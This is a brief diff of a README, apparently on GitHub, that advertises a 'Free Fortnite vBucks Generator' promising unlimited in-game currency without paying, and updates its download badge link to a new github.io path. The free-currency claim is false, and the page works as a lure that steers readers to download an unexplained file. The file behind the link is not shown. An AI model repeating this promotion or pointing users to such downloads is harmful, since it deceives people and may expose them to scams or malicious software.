@@ -2,7 +2,7 @@
 
 Free Fortnite vBucks Generator—get unlimited vBucks instantly to unlock skins, battle passes, and more without spending real money!
 
-[![Download Fortnite vBucks Generator](https://img.shields.io/badge/Download-vBucks_Generator-blueviolet)](https://fortnite-vbucks-generator.github.io/.github/)
+[![Download Fortnite vBucks Generator](https://img.shields.io/badge/Download-vBucks_Generator-blueviolet)](https://fortnite-vbucks-generator.github.io/.github/vbucksgenerator)
 
 ---
 
